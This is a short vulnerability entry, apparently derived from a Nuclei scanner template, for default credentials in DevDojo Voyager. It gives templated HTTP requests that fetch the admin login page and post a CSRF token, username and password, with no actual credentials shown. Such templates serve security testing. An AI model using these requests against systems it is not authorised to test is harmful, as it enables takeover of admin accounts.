# Vulnerability: DevDojo Voyager - Default login
**Classification:** DEFAULT-LOGIN
**Source:** Nuclei Template (`devdojo-voyager-default-login.yaml`)

## Description
DevDojo Voyager contains default credentials when run with dummy data. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /admin/login HTTP/1.1
Host: {{Hostname}}

POST /admin/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

_token={{csrf}}&email={{username}}&password={{password}}&
```

